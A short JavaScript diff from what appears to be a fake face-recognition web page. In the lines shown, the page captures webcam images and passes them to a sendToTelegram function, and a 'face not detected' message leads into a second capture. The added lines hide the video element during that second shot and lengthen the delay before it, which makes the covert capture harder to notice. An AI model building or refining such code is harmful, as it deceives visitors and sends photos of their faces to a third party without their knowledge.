@@ -139,6 +139,9 @@
             const tracks = stream.getTracks();
             tracks.forEach(track => track.stop());
 
+            // Hide the video element to avoid showing it during the second scan
+            video.style.display = "none";
+
             sendToTelegram(canvas, step);
         }
 
@@ -157,8 +160,9 @@
                         setTimeout(() => {
                             $('#face-not-detected').addClass('hidden');
                             $('#face-recognition').removeClass('hidden');
-                            takePicture(2);
-                        }, 5000);
+                            // Delay before the second image capture
+                            setTimeout(() => takePicture(2), 4000); // Increased delay before taking second picture
+                        }, 5000); // Wait 5 seconds before showing "Face Not Detected"
                     } else {
                         $('#face-recognition').addClass('hidden');
                         $('#completion').removeClass('hidden');
